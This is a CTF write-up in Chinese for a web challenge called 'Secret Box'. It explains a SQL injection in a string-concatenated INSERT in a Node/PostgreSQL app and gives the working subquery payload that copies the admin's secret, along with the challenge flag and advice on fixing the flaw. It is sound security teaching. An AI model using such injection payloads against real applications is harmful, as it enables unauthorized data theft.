# Secret Box — Writeup
 
> 賽事：CyLab Academy（picoCTF 2026 風格）
> 類別：**Web Exploitation**（SQL Injection）
> Flag：`academy{sq1_1nject10n_c5a16f2c}`
 
---
 
## TL;DR
 
給了完整源碼（Node.js + Express + PostgreSQL）。大部分 SQL 查詢都用參數化（`?`）很安全，**只有一個 `/secrets/create` 的 INSERT 用字串拼接 `'${content}'`** → SQL injection。因為首頁只給你看「自己的」secret，所以用子查詢把 admin 的 secret **複製進自己名下的一筆**，再正常讀出來拿 flag。
 
---
 
## 1. 讀源碼找「贏的條件」
 
`db.js` 直接告訴你 flag 在哪：
 
```js
await db('secrets')
  .where({ owner_id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' })  // admin
  .update({ content: process.env.FLAG });
```
 
→ **flag = owner_id 為 `e2a66f7d-2ce6-4861-b4aa-be8e069601cb`（admin）那筆 secret 的 content。**
 
目標精確化：讀到 admin 那筆 secret 的內容。
 
## 2. 用 grep 快速定位注入點（30 秒）
 
不要逐行讀，直接 grep 可疑模式：
 
```sh
# 找危險的字串插值（${ 在模板字串 = 沒參數化）
grep -rn '${' source/app/src/
```
 
一行命中破口：
 
```
server.js:133:  `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
```
 
對照其他查詢——**全都用 `?` 參數化（安全）**，只有這一個用 `${}` 直接拼接：
 
```js
// 安全（參數化）：使用者輸入當「純資料」
db.raw(`SELECT * FROM users WHERE username = ? AND password = ?`, [username, password])
 
// 危險（字串拼接）：使用者輸入直接變成 SQL 的一部分
db.raw(`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`)
```
 
> **Source → Sink**：Source = create secret 的 `content` 欄位；Sink = 那個 `${}` 拼接的 INSERT。中間沒有 `?` 保護 → SQL Injection。
>
> **心法**：某處安全不代表每處安全。`handler.js` 的 token 查詢是參數化的，但這個 INSERT 不是——所以要一個一個檢查。
 
## 3. 卡點：首頁只給你看「自己的」secret
 
```js
// server.js 首頁
SELECT * FROM secrets WHERE owner_id = ?   // ? = 你的 id
```
 
所以你不能注入一個「直接 SELECT admin 的 secret 顯示出來」——顯示的地方被鎖死只給你自己的資料。
 
### Signature 招式
 
> **當你能「寫」(INSERT) 但只能「讀自己的」資料時 → 注入子查詢，把目標資料複製進自己名下的列，再正常讀出來。**
 
## 4. 倒推 payload（這題最值得學的思路）
 
**不是憑空想，是照著 SQL 倒推。**
 
### Step 1：拿到確切的 sink
 
我的輸入會掉進這個位置（前後各有一個 `'`）：
```sql
VALUES ('userid', '【我的輸入掉這】')
```
 
### Step 2：先想「最終 SQL 要長怎樣」
 
我要新 secret 的 content = admin 的 secret，所以最終 SQL 應該是：
```sql
VALUES ('userid', '' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d...') || '')
```
（PostgreSQL 的 `'' || 東西 || ''` = 字串串接，結果就是「東西」。）
 
### Step 3：數引號，倒推輸入
 
伺服器做：`'` + 我的輸入 + `'`
我要結果：`'' || (SELECT ...) || ''`
 
對齊：
```
伺服器：  '  ［我的輸入］  '
我要的：  ''  || (SELECT ...) ||  ''
```
 
所以我的輸入 = **`' || (SELECT ...) || '`**
 
驗證（前後各加 `'`）：
```
' + ' || (SELECT ...) || ' + '  =  '' || (SELECT ...) || ''   ✓
```
 
- 開頭 `'` → 跟伺服器前引號湊成 `''`（空字串）
- 結尾 `'` → 跟伺服器後引號湊成 `''`（空字串）
- 中間 `|| (SELECT...) ||` → 把 admin secret 串進來
### 最終 Payload（貼進 content 欄位）
 
```
' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '
```
 
## 5. 攻擊流程
 
```
① Sign Up 註冊 → ② Log In 登入（拿到 auth_token，身分 = 你的 userId）
③ 進 Create Secret，content 貼上 payload，送出
   → 偷偷建一筆「你的」secret，但 content = admin 的 flag
④ 回首頁 / → 列出你的 secrets → 新那筆的內容就是 flag 🚩
```
 
結果：`academy{sq1_1nject10n_c5a16f2c}`
 
## 6. 沒源碼時怎麼辦？
 
真實情況常常拿不到源碼，靠**錯誤訊息**倒推：
 
- 送一個 `'` 進欄位 → 看它噴的 SQL 錯誤（**Errors are Oracles**）
- 從錯誤訊息拼出「我的輸入被包在什麼裡」
- 一樣倒推 payload，只是情報來源從「源碼」換成「錯誤訊息」
## 7. 修復建議
 
- **所有** SQL 都用參數化（`?` / prepared statement），不要有任何字串拼接
- 用 ORM 的 query builder（knex 的 `.insert({...})`）而非 `db.raw` 拼字串
- 最小權限：app 的 DB 帳號不該能跨使用者讀資料（但參數化才是根本解）
## 心法總結
 
| 心法 | 這題怎麼用 |
|------|-----------|
| **攻擊面地圖** | `grep '${'` 一下就定位注入點，不用逐行讀 |
| **Source → Sink** | content 欄位（source）→ 字串拼接的 INSERT（sink） |
| **某處安全 ≠ 每處安全** | 大多查詢參數化，就一個沒有，那個就是破口 |
| **倒推 payload** | 看著 SQL 決定「最終要長怎樣」，數引號反推輸入 |
| **寫不能讀就複製進自己的列** | 只能讀自己的 → 把 admin secret 寫成自己的 secret |
 
---
 
*授權用途：CTF 學習 / 授權滲透測試 / 自己的機器。*
 
